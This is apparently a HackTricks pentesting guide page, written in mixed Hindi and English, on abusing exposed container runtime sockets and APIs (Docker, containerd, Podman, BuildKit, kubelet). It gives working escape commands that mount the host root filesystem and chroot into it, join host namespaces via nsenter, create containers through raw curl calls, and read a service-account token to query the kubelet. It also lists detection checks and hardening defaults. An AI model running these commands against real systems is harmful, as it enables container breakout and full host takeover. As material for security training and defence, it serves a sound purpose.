# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

कई असली container compromises namespace escape से शुरू ही नहीं होते। वे runtime control plane तक पहुंच से शुरू होते हैं। यदि कोई workload `dockerd`, `containerd`, CRI-O, Podman, या kubelet से mounted Unix socket या exposed TCP listener के जरिए बात कर सकता है, तो attacker बेहतर privileges के साथ नया container request कर सकता है, host filesystem mount कर सकता है, host namespaces में join कर सकता है, या sensitive node information retrieve कर सकता है। ऐसे मामलों में, runtime API ही असली security boundary होती है, और इसे compromise करना व्यावहारिक रूप से host को compromise करने के बहुत करीब होता है।

इसीलिए runtime socket exposure को kernel protections से अलग document करना चाहिए। सामान्य seccomp, capabilities, और MAC confinement वाला container भी `/var/run/docker.sock` या `/run/containerd/containerd.sock` अगर उसके अंदर mounted है, तो host compromise से बस एक API call दूर हो सकता है। मौजूदा container की kernel isolation बिल्कुल वैसे ही काम कर रही हो सकती है जैसा design किया गया था, जबकि runtime management plane पूरी तरह exposed रहता है।

## Daemon Access Models

Docker Engine पारंपरिक रूप से अपनी privileged API को local Unix socket `unix:///var/run/docker.sock` के जरिए expose करता है। ऐतिहासिक रूप से इसे `tcp://0.0.0.0:2375` जैसे TCP listeners या `2376` पर TLS-protected listener के जरिए remotely भी expose किया गया है। मजबूत TLS और client authentication के बिना daemon को remotely expose करना effectively Docker API को remote root interface में बदल देता है।

containerd, CRI-O, Podman, और kubelet भी इसी तरह के high-impact surfaces expose करते हैं। नाम और workflows अलग हो सकते हैं, लेकिन logic नहीं। यदि interface caller को workloads create करने, host paths mount करने, credentials retrieve करने, या running containers बदलने देता है, तो वह interface एक privileged management channel है और उसके साथ वैसा ही व्यवहार करना चाहिए।

जांचने लायक common local paths हैं:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
पुराने या अधिक specialized stacks भी `dockershim.sock`, `frakti.sock`, या `rktlet.sock` जैसे endpoints expose कर सकते हैं। ये modern environments में कम common हैं, लेकिन जब मिलें तो इन्हें वही caution के साथ treat करना चाहिए क्योंकि ये ordinary application sockets के बजाय runtime-control surfaces represent करते हैं।

## Secure Remote Access

अगर किसी daemon को local socket से आगे expose करना ही पड़े, तो connection को TLS के साथ protect करना चाहिए और preferably mutual authentication के साथ, ताकि daemon client को verify करे और client daemon को verify करे। convenience के लिए Docker daemon को plain HTTP पर खोलने की पुरानी आदत container administration में सबसे dangerous mistakes में से एक है, क्योंकि API surface इतना strong है कि privileged containers directly create कर सकता है।

पुराना Docker configuration pattern इस तरह दिखता था:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd-आधारित hosts पर, daemon communication `fd://` के रूप में भी दिखाई दे सकती है, जिसका मतलब है कि process systemd से pre-opened socket inherit करता है, बजाय इसके कि वह इसे सीधे खुद bind करे। महत्वपूर्ण सीख exact syntax नहीं, बल्कि security consequence है। जिस moment daemon tightly permissioned local socket से आगे listen करता है, transport security और client authentication optional hardening नहीं रह जाते, बल्कि mandatory हो जाते हैं।

## Abuse

अगर कोई runtime socket present है, तो confirm करें कि वह कौन-सा है, क्या कोई compatible client मौजूद है, और क्या raw HTTP या gRPC access possible है:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
ये commands उपयोगी हैं क्योंकि ये एक dead path, एक mounted लेकिन inaccessible socket, और एक live privileged API के बीच अंतर बताते हैं। अगर client सफल हो जाता है, तो अगला सवाल यह है कि क्या API host bind mount या host namespace sharing के साथ नया container launch कर सकता है।

### When No Client Is Installed

`docker`, `podman`, या किसी अन्य friendly CLI की अनुपस्थिति का मतलब यह नहीं है कि socket safe है। Docker Engine अपने Unix socket के over HTTP बोलता है, और Podman `podman system service` के through एक Docker-compatible API और एक Libpod-native API दोनों expose करता है। इसका मतलब है कि सिर्फ `curl` वाला minimal environment भी daemon को drive करने के लिए पर्याप्त हो सकता है:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
यह post-exploitation के दौरान मायने रखता है क्योंकि defenders कभी-कभी सामान्य client binaries हटा देते हैं लेकिन management socket को mounted छोड़ देते हैं। Podman hosts पर, याद रखें कि high-value path rootful और rootless deployments के बीच अलग होता है: rootful service instances के लिए `unix:///run/podman/podman.sock` और rootless वालों के लिए `unix://$XDG_RUNTIME_DIR/podman/podman.sock`।

### Full Example: Docker Socket To Host Root

अगर `docker.sock` reachable है, तो classical escape यह है कि एक नया container start किया जाए जो host root filesystem को mount करे और फिर उसमें `chroot` किया जाए:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
यह Docker daemon के माध्यम से direct host-root execution प्रदान करता है। इसका impact केवल file reads तक सीमित नहीं है। नए container के अंदर पहुंचने के बाद, attacker host files को alter कर सकता है, credentials harvest कर सकता है, persistence implant कर सकता है, या additional privileged workloads शुरू कर सकता है।

### Full Example: Docker Socket To Host Namespaces

अगर attacker filesystem-only access के बजाय namespace entry prefer करता है:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
यह path runtime से एक नया container बनाने के लिए कहकर host तक पहुँचता है, जिसमें explicit host-namespace exposure होती है, बजाय मौजूदा container का exploit करने के।

### Full Example: containerd Socket

एक mounted `containerd` socket आमतौर पर उतना ही dangerous होता है:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
यदि अधिक Docker-like client मौजूद है, तो `nerdctl` `ctr` से अधिक सुविधाजनक हो सकता है क्योंकि यह `--privileged`, `--pid=host`, और `-v` जैसे familiar flags expose करता है:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
प्रभाव फिर से host compromise ही है। भले ही Docker-विशिष्ट tooling मौजूद न हो, कोई अन्य runtime API फिर भी वही administrative power दे सकता है। Kubernetes nodes पर, `crictl` भी reconnaissance और container interaction के लिए पर्याप्त हो सकता है क्योंकि यह सीधे CRI endpoint से बात करता है।

### BuildKit Socket

`buildkitd` को आसानी से miss किया जा सकता है क्योंकि लोग अक्सर इसे "सिर्फ build backend" समझते हैं, लेकिन daemon फिर भी एक privileged control plane है। एक reachable `buildkitd.sock` attacker को arbitrary build steps चलाने, worker capabilities inspect करने, compromised environment से local contexts use करने, और `network.host` या `security.insecure` जैसे dangerous entitlements request करने की अनुमति दे सकता है, जब daemon को उन्हें allow करने के लिए configured किया गया हो।

उपयोगी शुरुआती interactions हैं:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
यदि daemon build requests स्वीकार करता है, तो जांचें कि क्या insecure entitlements उपलब्ध हैं:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
सटीक प्रभाव daemon configuration पर निर्भर करता है, लेकिन permissive entitlements के साथ एक rootful BuildKit service कोई harmless developer convenience नहीं है। इसे एक और high-value administrative surface की तरह देखें, खासकर CI runners और shared build nodes पर।

### Kubelet API Over TCP

kubelet कोई container runtime नहीं है, लेकिन यह फिर भी node management plane का हिस्सा है और अक्सर उसी trust boundary discussion में आता है। अगर kubelet secure port `10250` workload से reachable है, या अगर node credentials, kubeconfigs, या proxy rights exposed हैं, तो attacker Pods enumerate कर सकता है, logs retrieve कर सकता है, या node-local containers में commands execute कर सकता है, बिना Kubernetes API server admission path को कभी touch किए।

cheap discovery से शुरू करें:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
यदि kubelet या API-server proxy path `exec` को authorize करता है, तो एक WebSocket-capable client इसे node पर अन्य containers में code execution में बदल सकता है। यही कारण है कि केवल `get` permission के साथ `nodes/proxy` जितना सुनाई देता है, उससे कहीं ज़्यादा खतरनाक है: request अभी भी kubelet endpoints तक पहुंच सकती है जो commands execute करते हैं, और ऐसी direct kubelet interactions normal Kubernetes audit logs में नहीं दिखतीं।

## Checks

इन checks का goal यह जवाब देना है कि क्या container किसी ऐसे management plane तक पहुंच सकता है जिसे trust boundary के बाहर ही रहना चाहिए था।
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
यहाँ क्या दिलचस्प है:

- Mounted runtime socket आमतौर पर सिर्फ information disclosure नहीं, बल्कि सीधा administrative primitive होता है।
- `2375` पर बिना TLS के TCP listener को remote-compromise condition की तरह treat किया जाना चाहिए।
- `DOCKER_HOST` जैसे environment variables अक्सर दिखाते हैं कि workload को जानबूझकर host runtime से बात करने के लिए design किया गया था।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से local Unix socket | `dockerd` local socket पर listen करता है और daemon आमतौर पर rootful होता है | `/var/run/docker.sock` mounting, `tcp://...:2375` exposing, `2376` पर weak या missing TLS |
| Podman | डिफ़ॉल्ट रूप से daemonless CLI | सामान्य local use के लिए long-lived privileged daemon की ज़रूरत नहीं होती; `podman system service` enabled होने पर API sockets फिर भी exposed हो सकते हैं | `podman.sock` exposing, service को broadly चलाना, rootful API use |
| containerd | Local privileged socket | Administrative API local socket के through exposed होता है और आमतौर पर higher-level tooling द्वारा consumed होता है | `containerd.sock` mounting, broad `ctr` या `nerdctl` access, privileged namespaces exposing |
| CRI-O | Local privileged socket | CRI endpoint node-local trusted components के लिए intended है | `crio.sock` mounting, CRI endpoint को untrusted workloads के लिए exposing |
| Kubernetes kubelet | Node-local management API | Kubelet को Pods से broadly reachable नहीं होना चाहिए; authn/authz पर निर्भर करते हुए access pod state, credentials, और execution features expose कर सकता है | kubelet sockets या certs mounting, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
